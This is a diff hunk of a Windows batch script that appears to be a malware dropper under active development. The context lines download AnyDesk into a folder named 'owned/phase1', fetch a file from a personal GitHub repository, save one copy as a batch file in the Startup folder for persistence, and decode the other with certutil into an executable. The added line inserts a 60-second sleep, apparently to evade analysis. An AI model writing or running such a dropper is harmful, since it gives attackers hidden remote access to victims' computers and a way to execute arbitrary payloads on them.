@@ -6,5 +6,6 @@ CreateObject^("Wscript.Shell"^).Run """" ^& WScript.Arguments^(0^) ^& """", 0, F
 curl -k "https://download.anydesk.com/AnyDesk.exe" -o "%tmp%/owned/phase1/AnyDesk.exe"
 curl -k "https://raw.githubusercontent.com/tlor89/test/6cdcbe59df550e5f25c0f2a2d84dc9b44736cfa8/test.txt" -o "%tmp%/test1.txt"
 curl -k "https://raw.githubusercontent.com/tlor89/test/6cdcbe59df550e5f25c0f2a2d84dc9b44736cfa8/test.txt" -o "%tmp%/test2.bat"
+sleep 60
 move /y test2.bat "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/test2.bat"
 certutil -decode "%tmp%/test1.txt" "%tmp%/test1.exe"
